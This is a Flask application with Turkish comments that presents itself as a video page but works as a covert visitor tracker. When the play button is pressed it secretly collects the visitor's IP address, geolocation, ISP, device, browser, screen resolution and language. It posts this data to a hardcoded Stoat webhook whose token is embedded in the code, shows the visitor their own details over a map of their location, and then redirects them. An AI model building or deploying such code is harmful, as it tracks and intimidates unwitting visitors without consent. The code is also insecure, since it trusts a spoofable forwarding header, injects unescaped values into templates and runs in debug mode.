from flask import Flask, request, render_template_string, jsonify
import requests

app = Flask(__name__)

# Stoat / Revolt Webhook URL'in (Güvenlik için backend'de saklanıyor)
WEBHOOK_URL = "https://stoat.chat/api/webhooks/01KTXYT5XP6FHMD8CH04GM269J/gKqTKtHWjMq3U_v8MKaGr5bnhSt_WKmuDkUziKl9z9zNsK4Z_Q6EZ1sRJdrngW-D"

def get_client_ip():
    if request.headers.getlist("X-Forwarded-For"):
        return request.headers.getlist("X-Forwarded-For")[0]
    return request.remote_addr

@app.route('/log', methods=['POST'])
def log_to_webhook():
    try:
        data = request.json
        
        # Stoat/Revolt için zengin metin (Markdown) mesaj formatı
        webhook_message = (
            "🚨 **YENİ ZİYARETÇİ LOGLANDI** 🚨\n"
            f"🌐 **IP Adresi:** `{data.get('ip')}`\n"
            f"📍 **Konum:** `{data.get('konum')}`\n"
            f"🏢 **İnternet Sağlayıcı:** `{data.get('isp')}`\n"
            f"💻 **İşletim Sistemi:** `{data.get('device')}`\n"
            f"🌍 **Tarayıcı:** `{data.get('browser')}`\n"
            f"🖥️ **Ekran Çözünürlüğü:** `{data.get('res')}`\n"
            f"🗣️ **Tarayıcı Dili:** `{data.get('lang')}`\n"
            "--------------------------------------------"
        )
        
        # Revolt/Stoat webhook'ları standart olarak {"content": "mesaj"} kabul eder
        requests.post(WEBHOOK_URL, json={"content": webhook_message}, timeout=5)
    except Exception as e:
        print(f"Webhook gönderim hatası: {e}")
        
    return jsonify({"status": "success"}), 200

@app.route('/')
def index():
    ip = get_client_ip()
    test_ip = "8.8.8.8" if ip in ("127.0.0.1", "::1") else ip

    try:
        geo = requests.get(f"http://ip-api.com/json/{test_ip}?lang=tr", timeout=5).json()
        lat = geo.get('lat', 41.0082)
        lon = geo.get('lon', 28.9784)
        
        map_url = f"https://www.openstreetmap.org/export/embed.html?bbox={lon-0.01}%2C{lat-0.005}%2C{lon+0.01}%2C{lat+0.005}&layer=mapnik"
        konum = f"{geo.get('city', 'Bilinmiyor')}, {geo.get('country', 'Bilinmiyor')}"
        isp = geo.get('isp', 'Bilinmiyor')
    except:
        map_url = "https://www.openstreetmap.org/export/embed.html?bbox=28.9684%2C41.0032%2C28.9884%2C41.0132&layer=mapnik"
        konum = "Bilinmiyor"
        isp = "Bilinmiyor"

    html = f"""
    <!DOCTYPE html>
    <html style="margin: 0 !important; padding: 0 !important; width: 100vw !important; height: 100vh !important;">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            html, body {{ 
                margin: 0 !important; 
                padding: 0 !important; 
                width: 100vw !important; 
                height: 100vh !important; 
                overflow: hidden !important; 
                background: #000; 
                color: #fff; 
                font-family: 'Arial', sans-serif; 
            }}
            #vid {{ position: fixed !important; width: 100vw !important; height: 100vh !important; top: 0 !important; left: 0 !important; object-fit: cover !important; z-index: 1; }}
            #map-img {{ position: fixed !important; width: 100vw !important; height: 100vh !important; top: 0 !important; left: 0 !important; border: none !important; margin: 0 !important; padding: 0 !important; z-index: 2; visibility: hidden; pointer-events: none; }}
            #panel {{ position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10; text-align: center; width: 100%; }}
            .data {{ display: none; font-size: 42px; font-weight: 900; margin: 15px 0; color: #ffffff; text-shadow: 3px 3px 0px #000, -3px -3px 0px #000, 3px -3px 0px #000, -3px 3px 0px #000, 0px 4px 10px #000; letter-spacing: 2px; }}
            #play-icon {{ position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 100px; z-index: 20; cursor: pointer; color: white; }}
        </style>
    </head>
    <body onclick="start()">
        <div id="play-icon">▶</div>
        <video id="vid"><source src="/static/video.mp4" type="video/mp4"></video>
        <iframe id="map-img" src="{map_url}"></iframe>

        <div id="panel">
            <div id="d1" class="data">IP: {ip}</div>
            <div id="d2" class="data">KONUM: {konum}</div>
            <div id="d3" class="data">İSS: {isp}</div>
            <div id="d4" class="data">CİHAZ: <span id="dev"></span></div>
            <div id="d5" class="data">TARAYICI: <span id="browser"></span></div>
            <div id="d6" class="data">ÇÖZÜNÜRLÜK: <span id="res"></span></div>
            <div id="d7" class="data">DİL: <span id="lang"></span></div>
        </div>

        <script>
            // Tarayıcı verilerini değişkenlere atıyoruz
            const devInfo = navigator.platform;
            const browserInfo = navigator.userAgent.split(' ').slice(-2).join(' ');
            const resInfo = window.screen.width + "x" + window.screen.height;
            const langInfo = navigator.language;

            document.getElementById('dev').innerText = devInfo;
            document.getElementById('browser').innerText = browserInfo;
            document.getElementById('res').innerText = resInfo;
            document.getElementById('lang').innerText = langInfo;

            function start() {{
                const video = document.getElementById('vid');
                document.getElementById('play-icon').style.display = 'none';
                video.play();
                
                // Oynat butonuna basıldığı an arka planda gizlice verileri Stoat'a postala
                const payload = {{
                    ip: "{ip}",
                    konum: "{konum}",
                    isp: "{isp}",
                    device: devInfo,
                    browser: browserInfo,
                    res: resInfo,
                    lang: langInfo
                }};

                fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(payload)
                }});
                
                // 9. saniyede yazılar ekrana düşer
                setTimeout(() => {{
                    for(let i=1; i<=7; i++) {{
                        setTimeout(() => {{ 
                            document.getElementById('d'+i).style.display = 'block'; 
                        }}, (i - 1) * 1000); 
                    }}
                    
                    // Harita tam ekran açılır
                    setTimeout(() => {{
                        document.getElementById('map-img').style.visibility = 'visible';
                    }}, 7000);

                }}, 9000);

                // Video bittiği saniye Google'a uçurur
                video.onended = function() {{
                    window.location.href = "https://cznull.github.io/vsv";
                }};
            }}
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

if __name__ == '__main__':
    app.run(debug=True)
